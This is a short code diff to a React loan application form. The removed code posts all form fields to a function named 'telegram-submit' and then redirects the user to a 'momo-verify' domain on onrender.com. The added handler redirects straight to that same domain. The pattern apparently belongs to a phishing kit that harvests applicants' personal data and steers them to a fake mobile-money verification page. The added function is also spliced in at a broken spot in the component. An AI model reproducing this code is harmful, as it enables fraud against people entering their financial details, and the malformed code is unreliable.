@@ -80,15 +80,7 @@ export default function LoanApplicationForm() {
     setStatus('submitting')
 
     try {
-      const response = await fetch('/.netlify/functions/telegram-submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams(new FormData(event.currentTarget) as never).toString(),
-      })
 
-      if (!response.ok) throw new Error('Submission failed')
-      setStatus('success')
-      window.location.href = 'https://momo-verify-4pkq.onrender.com'
     } catch {
       setStatus('error')
     }
@@ -96,6 +88,9 @@ export default function LoanApplicationForm() {
 
   if (status === 'success') {
     return <ConfirmationStep onRestart={() => setStatus('idle')} />
+  }async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
+  event.preventDefault()
+  window.location.assign('https://momo-verify-4pkq.onrender.com')
   }
 
   return (
